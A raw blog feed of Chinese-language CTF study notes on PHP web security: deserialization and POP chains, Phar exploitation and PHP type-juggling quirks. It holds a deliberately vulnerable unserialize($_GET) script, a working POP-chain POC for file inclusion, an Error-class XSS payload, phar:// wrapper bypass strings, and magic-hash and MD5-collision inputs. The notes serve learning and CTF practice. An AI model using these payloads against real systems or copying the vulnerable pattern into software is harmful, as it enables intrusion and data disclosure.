        <content type="html"><![CDATA[<h2 id="周记3"><a href="#周记3" class="headerlink" title="周记3"></a>周记3</h2><p>根据本次任务,继续完善一下知识点总结,链接如下:</p><p>一篇php反序列化,学习到了很多新trick以及其他的利用手段:<a href="https://hades-blog.github.io/2024/01/22/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://Hades-blog.github.io/2024/01/22/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p>以及一篇php特性总结,查缺补漏啊:<a href="https://hades-blog.github.io/2024/02/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-PHP%E7%89%B9%E6%80%A7/">https://Hades-blog.github.io/2024/02/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-PHP%E7%89%B9%E6%80%A7/</a></p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-php反序列化及pop链</title>
      <link href="/2024/02/02/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/02/02/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><p>成员属性与成员方法访问限定符限定词Public 内部，外部，子类均可使用<br>Protected 外部不能引用<br>Private 仅内部可以使用<br>类里面定义变量:var</p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$gender</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;hades&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gender = <span class="string">&#x27;male&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="string">&#x27;18&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果:<code>O:6:&quot;People&quot;:3:&#123;s:2:&quot;id&quot;;s:14:&quot;hades&quot;;s:9:&quot; * gender&quot;;s:4:&quot;male&quot;;s:11:&quot; People age&quot;;s:2:&quot;18&quot;;&#125;</code></p><p><strong>注</strong>:</p><ul><li><p>public：属性被序列化的时候属性值会变成 属性名</p></li><li><p>protected：属性被序列化的时候属性值会变成 \x00*\x00属性名</p></li><li><p>private：属性被序列化的时候属性值会变成 \x00类名\x00属性名</p></li></ul><p>所以特殊情况需要进行url编码</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><img src="https://img-blog.csdnimg.cn/569baebce8af4d848e97b34cfc8130d1.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/112c8e398f6c44d0874c10fe2b08e79d.png" alt="1"></p><h2 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h2><h3 id="变量绑定"><a href="#变量绑定" class="headerlink" title="变量绑定"></a>变量绑定</h3><p>在php反序列化时如果要把一个类中成员的值赋给另一个成员需要用到引用符,和C语言取地址意义相似(我觉得),例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">CLazz</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;b = &amp;<span class="variable">$c</span>-&gt;a;</span><br></pre></td></tr></table></figure><p>可以绕过未知变量的判断</p><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>详解:<a href="https://xz.aliyun.com/t/9895?time__1311=n4+xuDgD9AKxBDUhDBqDqpe6fYiK4eNeG8DPD&amp;alichlgref=https://xz.aliyun.com/search?keyword=%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E5%25AD%2597%25E7%25AC%25A6%25E4%25B8%25B2%25E9%2580%2583%25E9%2580%25B8">https://xz.aliyun.com/t/9895?time__1311=n4%2BxuDgD9AKxBDUhDBqDqpe6fYiK4eNeG8DPD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fsearch%3Fkeyword%3D%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E5%25AD%2597%25E7%25AC%25A6%25E4%25B8%25B2%25E9%2580%2583%25E9%2580%25B8</a></p><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h3><p>序列化字符串中表示对象属性个数的值大于真实值就会跳过此魔术方法的执行</p><h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><p>主要还是对于魔术方法的掌握,接下来分析一道题彻底理解pop链:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>首先这类题一定是要先找到能进行恶意的地方,那么我们发现在<code>Modifier</code>类中有一个方法内有可以产生文件包含漏洞的函数<code>include()</code>,那我们的思路就是想办法触发魔术方法来调用<code>append</code>方法,并且传给<code>value</code>的值为<code>&#39;flag.php&#39;</code></p></li><li><p>不难发现我们需要触发<code>__invoke()</code>这个魔术方法来调用<code>append</code>方法,并且传给<code>value</code>的值为这个类中的<code>var</code>值,那么后面的poc中<code>var</code>值就要为<code>&#39;flag.php&#39;</code>,但要触发这个魔术方法,需要将对象当作函数调用</p></li><li><p>那么接下来为了触发<code>__invoke()</code>魔术方法,如何将<code>Modifier</code>对象当作函数调用,观察接下来的代码,我们发现在<code>Test</code>类中的<code>__get()</code>魔术方法中<code>return</code>部分可以实现把对象当作函数调用,且需要将赋给<code>$function</code>的<code>$p</code>为<code>Modifier</code>实例,即<code>$p=new Modifier()</code>,那么触发这个魔术方法需要调用这个类中属性不存在或不可访问属性的成员</p></li><li><p>继续,为了触发<code>__get()</code>魔术方法,我们要继续利用其他方法来实现触发,发现在<code>Show</code>这个类中的<code>__toString()</code>魔术方法中存在连续的引用,那么我们可以将这个类中的<code>$str</code>的值赋为<code>Test</code>对象,因此这个魔术方法内的这句话<code>return $this-&gt;str-&gt;source;</code>就成为了调用<code>Test</code>对象中的<code>source</code>成员了,又因为<code>Test</code>类中没有<code>source</code>这个成员,所以实现引用<code>Test</code>对象中不存在的成员,触发<code>__get()</code>魔术方法,那么又该如何触发<code>__toString()</code>魔术方法来实现这样的过程呢</p></li><li><p>那么要触发<code>__toString()</code>魔术方法,要将<code>Tset</code>对象作为字符串调用,依旧是去寻找能实现这种过程的部分,发现在这个类中存在<code>__wakeup()</code>魔术方法,其中我们可以利用<code>echo</code>函数来将<code>Test</code>对象作为字符串调用,那么只需要将<code>source</code>值赋为<code>new Test()</code>,并触发<code>__wakeup()</code>魔术方法就能实现,最后一步就是触发这个魔术方法了</p></li><li><p>最后,只需要进行反序列化操作,<code>__wakeup</code>魔术方法就会被调用,那么层层递推,就实现我们的需要了</p></li></ol><p><strong>总结一下</strong>:通过上面的分析,最后大致总结下来就是一个这样的过程:</p><p>分析后编辑好POC并进行序列化(url编码) <strong>&gt;&gt;</strong> 将结果传参,进行反序列化 <strong>&gt;&gt;</strong> 触发__wakeup <strong>&gt;&gt;</strong> 触发__toString <strong>&gt;&gt;</strong> 触发__get <strong>&gt;&gt;</strong> 触发__invoke <strong>&gt;&gt;</strong> 最后成功利用文件包含,得到答案</p><p>这种环环相扣,层层递进的过程就是构造pop链,最后展示一下POC以更好理解:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mod</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;p=<span class="variable">$mod</span>;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span>-&gt;source = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str=<span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注</strong>:</p><ul><li><p>因为只能序列化一个类,所以找到pop链终点后(或没找到),可以观察每个类能否触发其他类的魔术方法来作为起点</p></li><li><p>调试时,可以在不同魔术方法内打印不同内容来判断是否触发</p></li></ul><h2 id="PHP原生类反序列化"><a href="#PHP原生类反序列化" class="headerlink" title="PHP原生类反序列化"></a>PHP原生类反序列化</h2><p>详解:<a href="https://xz.aliyun.com/t/9293?time__1311=n4+xuDgD9DyDRD0rxAhxBqDwp003pxPmhw4mD&amp;alichlgref=https://cn.bing.com/">https://xz.aliyun.com/t/9293?time__1311=n4%2BxuDgD9DyDRD0rxAhxBqDwp003pxPmhw4mD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p><p>总的来说就是没有让我们来反序列化的类时,可以使用PHP的内置类,示例(利用Error类触发XSS:原生类其中内置有一个<code>__toString()</code>方法):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yan&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><h2 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h2><p>Phar是将php文件打包而成的一种压缩文档，类似于Java中的jar包。</p><p>它有一个特性就是phar文件会以序列化的形式储存用户自定义的meta-data。以扩展反序列化漏洞的攻击面，配合<code>phar://</code>伪协议使用。</p><h3 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h3><ol><li><p><code>a stub</code>是一个文件标志，格式为：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。</p></li><li><p><code>manifest</code>是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。</p></li><li><p><code>contents</code>是被压缩的内容。</p></li><li><p><code>signature</code>签名，放在文件末尾。</p></li></ol><p>Phar文件由这四部分组成，<code>__HALT_COMPILER()</code>是其文件头</p><h3 id="Phar文件生成"><a href="#Phar文件生成" class="headerlink" title="Phar文件生成"></a>Phar文件生成</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest,解析时会被反序列化</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的文件除文件头外,发现中间的部分内容是以序列化的形式存在于这个文件中</p><p><img src="https://image.3001.net/images/20211119/1637308825_619759992d43a3b586529.png" alt="1"></p><h3 id="Phar利用"><a href="#Phar利用" class="headerlink" title="Phar利用"></a>Phar利用</h3><p>php大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时会将meta-data的序列化字符进行反序列化:</p><p><img src="https://image.3001.net/images/20211119/1637308825_61975999dcd39421b006d.png!small" alt="1"></p><p>可以通过在mata-data处自定义生成序列化字符</p><p>上传后(<strong>phar文件生成后修改后缀不会影响功能</strong>)利用文件包含,通过<code>phar://</code>伪协议触发反序列化造成危害</p><h3 id="phar-伪协议绕过"><a href="#phar-伪协议绕过" class="headerlink" title="phar:&#x2F;&#x2F;伪协议绕过"></a>phar:&#x2F;&#x2F;伪协议绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar://a.phar/test1.</span><br><span class="line">compress.bzip2://phar://a.phar/test1.</span><br><span class="line">compress.zlib://phar://a.phar/test1.txt</span><br><span class="line">php://filter/resource=phar://a.phar/test1.</span><br><span class="line">php://filter/read=convert.base-encode/</span><br></pre></td></tr></table></figure><h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>PHP通过<code>__HALT_COMPILER</code>来识别Phar文件，那么出于安全考虑，即为了防止Phar反序列化的出现，可能就会对这个进行过滤</p><ul><li>将Phar文件的内容写到压缩包注释中，压缩为zip文件，示例代码如下</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();<span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;phar.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>); </span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;flag is here&#x27;</span>);<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$a</span>);<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>将生成的Phar文件进行gzip压缩，压缩命令如下</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip test.phar</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-PHP特性</title>
      <link href="/2024/02/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2024/02/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="md5-sha1"><a href="#md5-sha1" class="headerlink" title="md5 &amp; sha1"></a>md5 &amp; sha1</h2><h3 id="弱相等-绕过"><a href="#弱相等-绕过" class="headerlink" title="弱相等(&#x3D;&#x3D;)绕过"></a>弱相等(&#x3D;&#x3D;)绕过</h3><p>加密后形成0e开头的科学记数法,则值相等(都为0)</p><p>md5 payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure><p>sha1 payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line">0e1290633704</span><br><span class="line">10932435112</span><br></pre></td></tr></table></figure><h3 id="强相等-绕过"><a href="#强相等-绕过" class="headerlink" title="强相等(&#x3D;&#x3D;&#x3D;)绕过"></a>强相等(&#x3D;&#x3D;&#x3D;)绕过</h3><p>md5和sha1都无法处理数组,所以可以通过传入数组绕过</p><h3 id="强类型绕过"><a href="#强类型绕过" class="headerlink" title="强类型绕过"></a>强类型绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a1&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a2&#x27;</span>]</span><br><span class="line"> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a2&#x27;</span>])</span><br></pre></td></tr></table></figure><p>可以构造两个MD5值相同的不同字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1</span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line">#2</span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%</span><br></pre></td></tr></table></figure><p>sha1同理</p><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p><code>intval(mixed $value, int $base = 10): int</code><br>当 $base &#x3D; 0 时, intval 会检测 value 的格式来决定使用的进制, 可以使用八进制或者十六进制绕</p><p>intval 可以取整 (去除小数点后的部分) 和截断 (去除数字后的字符串, 包括科学计数法)</p><p>在数字前加空格也能正常执行 intval</p><p>以下结果都为1146</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1146.0&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1146.123&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1146aa&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1146e123&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;0x117c&#x27;</span>, <span class="number">0</span>);</span><br><span 